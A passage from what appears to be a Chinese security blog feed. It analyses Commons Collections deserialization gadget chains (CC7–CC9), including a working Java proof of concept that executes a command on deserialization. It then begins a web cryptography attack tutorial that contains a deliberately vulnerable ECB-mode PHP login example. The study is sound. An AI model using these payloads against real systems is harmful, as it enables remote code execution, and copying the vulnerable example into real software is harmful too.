class="keyword">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// 生成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 本地测试触发</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简化链中用到了 HashMap#readObject 中的 hash 方法来触发 hashCode 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">……</span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                    K key = (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                    V value = (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h1><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ComCol7</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException,</span></span><br><span class="line"><span class="function">            InvocationTargetException, InstantiationException, IOException, NoSuchFieldException </span>&#123;</span><br><span class="line">        Transformer[] realPoc  = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",</span><br><span class="line">                        new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123; ("calc")&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        ChainedTransformer fakeChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="string">"random"</span>)&#125;);</span><br><span class="line"></span><br><span class="line">        Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">        Map lazyMap1 = LazyMap.decorate(innerMap1, fakeChain);</span><br><span class="line">        lazyMap1.put(<span class="string">"yy"</span>, <span class="number">1</span>);</span><br><span class="line">        Map lazyMap2 = LazyMap.decorate(innerMap2, fakeChain);</span><br><span class="line">        lazyMap2.put(<span class="string">"zZ"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">        Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(fakeChain, realPoc);</span><br><span class="line"></span><br><span class="line">        lazyMap2.remove(<span class="string">"yy"</span>);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(hashtable);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cc7通过AbstractMap#equals来触发对LazyMap#get方法的调用。如果这里的m是我们可控的，那么我们设置m为LazyMap，即可完成后面的rce触发。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">      <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">          <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">              Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">              K key = e.getKey();</span><br><span class="line">              V value = e.getValue();</span><br><span class="line">              <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">if</span> (!(m.get(key)==<span class="keyword">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure><p>先寻找调用equals方法的点，cc7中使用了HashTable#reconstitutionPut：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> StreamCorruptedException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="keyword">int</span> hash = key.hashCode();</span><br><span class="line">    <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="keyword">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的key如果是我们可控的，那么m就是我们可控的，接着在HashTable#readObject中调用了reconstitutionPut方法，并将key传递进去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ……</span><br><span class="line">    <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">            K key = (K)s.readObject();</span><br><span class="line">        <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">            V value = (V)s.readObject();</span><br><span class="line">        <span class="comment">// sync is eliminated for performance</span></span><br><span class="line">        reconstitutionPut(table, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在readObject方法中传递进去的key，是使用readObject得到的，那么在writeObject处，也必然会有：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    Entry&lt;Object, Object&gt; entryStack = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">        <span class="comment">// Write out the threshold and loadFactor</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Write out the length and count of elements</span></span><br><span class="line">        s.writeInt(table.length);</span><br><span class="line">        s.writeInt(count);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Stack copies of the entries in the table</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; table.length; index++) &#123;</span><br><span class="line">            Entry&lt;?,?&gt; entry = table[index];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (entry != <span class="keyword">null</span>) &#123;</span><br><span class="line">                entryStack =</span><br><span class="line">                    <span class="keyword">new</span> Entry&lt;&gt;(<span class="number">0</span>, entry.key, entry.value, entryStack);</span><br><span class="line">                entry = entry.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out the key/value objects from the stacked entries</span></span><br><span class="line">    <span class="keyword">while</span> (entryStack != <span class="keyword">null</span>) &#123;</span><br><span class="line">        s.writeObject(entryStack.key);</span><br><span class="line">        s.writeObject(entryStack.value);</span><br><span class="line">        entryStack = entryStack.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.为什么要调用两次put?<br>2.为什么调用的两次put其中map中key的值分别为yy和zZ?<br>3.为什么在调用完HashTable#put之后，还需要在map2中remove掉yy？<br>详细原理可看此文章：<br><a href="https://paper.seebug.org/1242/#commons-collections-7" target="_blank" rel="noopener">https://paper.seebug.org/1242/#commons-collections-7</a>   </p><h1 id="CommonsCollections8"><a href="#CommonsCollections8" class="headerlink" title="CommonsCollections8"></a>CommonsCollections8</h1><p>分析见这篇文章：<a href="https://www.anquanke.com/post/id/190472#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/190472#h3-4</a></p><p>CommonsCollections8是今年navalorenzo推送到ysoserial上的，8与2，4的区别在于使用了新的readObject触发点TreeBag</p><h1 id="CommonsCollections9"><a href="#CommonsCollections9" class="headerlink" title="CommonsCollections9"></a>CommonsCollections9</h1><p>主要利用的是CommonsCollections:3.2版本新增的 DefaultedMap 来代替 LazyMap</p><p>3.2.2 版本使用了黑名单，禁止了 InvokerTransformer 类在序列化和反序列化的使用<br>4.1 InvokerTransformer 和 InstantiateTransformer 两个类都没有实现 Serializable 接口  </p><p>参考文章<br>Ysoserial CommonsCollections1 详细分析：<a href="https://www.anquanke.com/post/id/230788" target="_blank" rel="noopener">https://www.anquanke.com/post/id/230788</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652475014&idx=1&sn=d52a42fef5c242ff5e597aba720dc4e5" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br>Commons Collections 反序列化利用链分析：<a href="https://p2hm1n.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://p2hm1n.com/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</a></p><p>ysoserial CommonsCollections2 详细分析：<a href="https://www.anquanke.com/post/id/232592" target="_blank" rel="noopener">https://www.anquanke.com/post/id/232592</a><br>Java安全之反序列化篇-URLDNS&amp;Commons Collections 1-7反序列化链分析：<a href="https://paper.seebug.org/1242/" target="_blank" rel="noopener">https://paper.seebug.org/1242/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>WEB密码学攻击方式从0到1</title>
    <link href="https://blog.cfyqy.com/article/4641618b.html"/>
    <id>https://blog.cfyqy.com/article/4641618b.html</id>
    <published>2021-03-01T16:08:31.000Z</published>
    <updated>2021-03-03T01:09:38.190Z</updated>
    
    <content type="html"><![CDATA[<p>ECB、CBC分组模式攻击方式和Hash长度扩展攻击</p><a id="more"></a><h3 id="0x1基本概念"><a href="#0x1基本概念" class="headerlink" title="0x1基本概念"></a>0x1基本概念</h3><h4 id="0x1-1分组密码"><a href="#0x1-1分组密码" class="headerlink" title="0x1.1分组密码"></a>0x1.1分组密码</h4><p>分组密码又称为分块加密或块加密，是一种对称加密算法，这类算法将明文分成多个等长的组，使用确定的算法和对称秘钥对每组分别加密或解密，常见的算法有DES、3DES、AES。</p><h5 id="0x1-1-1-加密算法"><a href="#0x1-1-1-加密算法" class="headerlink" title="0x1.1.1 加密算法"></a>0x1.1.1 加密算法</h5><p>DES需要加密的明文按64位进行分组，加密密钥是根据用户输入的秘钥生成的，密钥长64位，但密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位， 使得每个密钥都有奇数个1，在计算密钥时要忽略这8位），分组后的明文组和56位的密钥按位替代或交换的方法形成密文组的加密方法。   </p><p>DES算法加密流程 ：<br>（1）输入64位明文数据，并进行初始置换IP；<br>（2）在初始置换IP后，明文数据再被分为左右两部分，每部分32位，以L0，R0表示；<br>（3）在秘钥的控制下，经过16轮运算(f)；<br>（4）16轮后，左、右两部分交换，并连接再一起，再进行逆置换；<br>（5）输出64位密文。<br><img src="../../images/cipher/web1/1.jpg" alt="">  </p><p>由于DES密码长度容易被暴力破解，所以3DES算法通过对DES算法进行改进，增加DES的密钥长度来避免类似的攻击，针对每个数据块进行三次DES加密；因此，3DES加密算法并非什么新的加密算法，是DES的一个更安全的变形，它以DES为基本模块，通过组合分组方法设计出分组加密算法。<br>该算法的加解密过程分别是对明文数据进行三次DES加密或解密,得到明文。<br><img src="../../images/cipher/web1/2.jpg" alt=""></p><p>AES（Advanced Encryption Standard），在密码学中又称Rijndael加密法，是美国联邦政府采用的一种分组加密标准。这个标准用来替代原先的DES。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同。</p><p>AES加密过程涉及到4种操作：字节替代、行移位、列混淆和轮密钥加。<br><img src="../../images/cipher/web1/3.jpg" alt=""></p><h3 id="0x1-1-2-分组模式"><a href="#0x1-1-2-分组模式" class="headerlink" title="0x1.1.2 分组模式"></a>0x1.1.2 分组模式</h3><p>在分组加密算法中，有ECB,CBC,CFB,OFB,CTR这几种算法模式。这里就对常见的ECB和CBC模式简单介绍。  </p><p>ECB 模式全称为电子密码本模式（Electronic codebook），在ECB模式中，将明文分组加密之后的结果将直接成为密文分组。<br>ECB加密：<br><img src="../../images/cipher/web1/4.jpg" alt=""><br>ECB解密：<br><img src="../../images/cipher/web1/5.jpg" alt=""><br>CBC 全称为密码分组链接（Cipher-block chaining） 模式。在CBC模式中，首先将明文分组与前一个密文分组进行XOR运算，然后再进行加密。第一个明文分组需要一个初始化向量(IV)进行XOR运算。<br>CBC加密：<br><img src="../../images/cipher/web1/6.jpg" alt=""><br>CBC解密：<br><img src="../../images/cipher/web1/7.jpg" alt=""></p><h2 id="0x1-2Hash算法"><a href="#0x1-2Hash算法" class="headerlink" title="0x1.2Hash算法"></a>0x1.2Hash算法</h2><p>Hash是把任意长度的输入通过散列算法变换成固定长度的输出，该输出就是散列值。<br>常见的hash算法有MD5、SHA1、SHA256 、SHA512等。<br><img src="../../images/cipher/web1/9.jpg" alt=""><br>MD5 算法的输入为长度小于 264 bit 的消息比特串，输出为固定 128 bit 的消息散列值，输入数据需要以 512 bit 为单位进行分组。     </p><p>MD5的实现原理图：<br><img src="../../images/cipher/web1/8.jpg" alt=""><br>MD5实现步骤：<br>（1）填充bits<br>  如果输入message(bit)对512求余的结果不等于448，就需要填充使其结果等于448。补位二进制是在message的后面加上一个1，后面跟着 n 个0。在 16 进制下，需要在message后补80，就是 2 进制的10000000。填充完后，len(message)mod512=448(bit)。<br>（2）补充长度<br>补位之后，用64位来存储填充前信息长度。这64位加在第一步结果的后面。这样len(message)mod512=0。长度是小端存储的，也就是说高字节放在高地址中。<br>例如要对 “hello world”进行填充：”hello world”是11个字母，11 byte (88 bit )，换算成16进制位0x58，其后跟着7个字节的0x00，则：<br><img src="../../images/cipher/web1/10.jpg" alt=""><br>（3）初始化向量<br>初始链接变量 IV 在最开始存于 4 个 32 bit 的寄存器 A、B、C、D 中，将参与第一个分组单元的哈希运算，它们分别为：<br><img src="../../images/cipher/web1/11.jpg" alt=""><br>（4）复杂的函数运算   </p><h1 id="0x2-攻击方式"><a href="#0x2-攻击方式" class="headerlink" title="0x2 攻击方式"></a>0x2 攻击方式</h1><h2 id="0x2-1ECB模式攻击"><a href="#0x2-1ECB模式攻击" class="headerlink" title="0x2.1ECB模式攻击"></a>0x2.1ECB模式攻击</h2><p>ECB将明文分组加密后直接成为密文分组，而密文则是由密文分组直接拼接而成。<br>因为每个分组都独自进行加密解密，所以无需破解密文就能操纵部分明文，或者改变明文，在不知道加密算法的情况下得到密文，从而达到攻击效果。     </p><p>例题：<br>cbc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//php7</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AES</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    $privateKey = <span class="string">"12345678123456781234567812345678"</span>;</span><br><span class="line">    $encrypted=openssl_encrypt($data,<span class="string">'AES-128-ECB'</span>,$privateKey,OPENSSL_RAW_DATA);</span><br><span class="line">    <span class="comment">#$encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $privateKey, $data, MCRYPT_MODE_ECB);</span></span><br><span class="line">    $encryptedData = (base64_encode($encrypted));</span><br><span class="line">    <span class="keyword">return</span> $encryptedData;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DE__AES</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    $privateKey = <span class="string">"12345678123456781234567812345678"</span>;</span><br><span class="line">    $encryptedData = base64_decode($data);</span><br><span class="line">   $decrypted=openssl_decrypt($encryptedData,<span class="string">'AES-128-ECB'</span>,$privateKey,OPENSSL_RAW_DATA);</span><br><span class="line">    $decrypted = rtrim($decrypted, <span class="string">""</span>) ;</span><br><span class="line">    <span class="keyword">return</span> $decrypted;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@$_GET[<span class="string">'a'</span>]==<span class="string">'reg'</span>)&#123;</span><br><span class="line">    setcookie(<span class="string">'uid'</span>, AES(<span class="string">'9'</span>));</span><br><span class="line">    setcookie(<span class="string">'username'</span>, AES($_POST[<span class="string">'username'</span>]));</span><br><span class="line">    header(<span class="string">"Location: http://127.0.0.1/ecb.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@!<span class="keyword">isset</span>($_COOKIE[<span class="string">'uid'</span>])||@!<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;form method="post" action="ecb.php?a=reg"&gt;</span></span><br><span class="line"><span class="string">Username:&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input type="text"  name="username"&gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;</span></span><br><span class="line"><span class="string">Password:&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input type="text" name="password" &gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input type="submit" value="注册"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt; '</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $uid = DE__AES($_COOKIE[<span class="string">'uid'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( $uid != <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'uid:'</span> .$uid .<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hi '</span> . DE__AES($_COOKIE[<span class="string">'username'</span>]) .<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You are not administrotor!!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"Hi you are administrotor!!"</span> .<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"> 